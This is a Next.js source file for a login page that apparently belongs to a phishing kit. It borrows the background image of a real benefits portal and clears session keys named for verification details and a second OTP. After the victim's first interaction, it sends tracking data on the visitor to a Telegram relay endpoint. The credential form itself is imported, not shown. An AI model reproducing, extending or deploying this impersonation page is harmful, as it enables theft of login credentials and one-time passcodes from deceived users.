"use client";

import { useState, useEffect, useRef } from "react";
import { LoginForm } from "@/components/login-form";
import { Preloader } from "@/components/preloader";
import { SiteFooter } from "@/components/site-footer";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [showContent, setShowContent] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  return (
    <>
      {!showContent && <Preloader onComplete={() => setShowContent(true)} />}
      {showContent && (
        <div className="relative min-h-screen overflow-hidden bg-[#f9f9f9] text-slate-900">
          <div className="absolute inset-0">
            <div
              className="absolute inset-0 bg-contain bg-no-repeat"
              style={{
                backgroundImage:
                  "url('https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/16731/master/UCEDocuments/UpointRedesign/LoginBGImages/image5_image_large.jpg')",
                backgroundPosition: "100% 0px",
              }}
            />
          </div>

          <div className="relative z-10 flex min-h-screen flex-col">
            <main className="flex-1 px-4 py-14 sm:px-6 lg:px-8 xl:px-10">
              <div className="flex min-h-[calc(100vh-6rem)] items-start justify-start">
                <div className="w-full max-w-[380px] border border-slate-200/90 bg-white/90 p-6 shadow-[0_28px_88px_rgba(0,0,0,0.18)] backdrop-blur-xl ring-1 ring-white/90 sm:p-7">
                  <LoginForm visitorInfo={visitorInfo} />
                </div>
              </div>
            </main>

            <SiteFooter className="w-full bg-white" />
          </div>
        </div>
      )}
    </>
  );
}
